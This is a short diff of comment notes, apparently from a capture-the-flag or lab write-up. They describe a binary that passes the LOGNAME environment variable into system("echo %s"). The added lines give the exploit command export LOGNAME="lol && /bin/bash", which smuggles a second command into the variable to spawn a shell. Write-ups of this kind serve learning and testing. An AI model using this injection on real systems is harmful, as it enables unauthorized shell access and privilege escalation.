@@ -1,5 +1,4 @@
-# reversing the binary we found that getenv("LOGNAME")
-# at the end there is system("echo %s") where %s is the 
-# variable pointing to "LOGNAME"
-# so we update the var to "lol && /bin/bash"
+# Found that getenv()
+# With the strings command and env we understood the binary used LOGNAME
+# export LOGNAME="lol && /bin/bash"
 # Et voila.
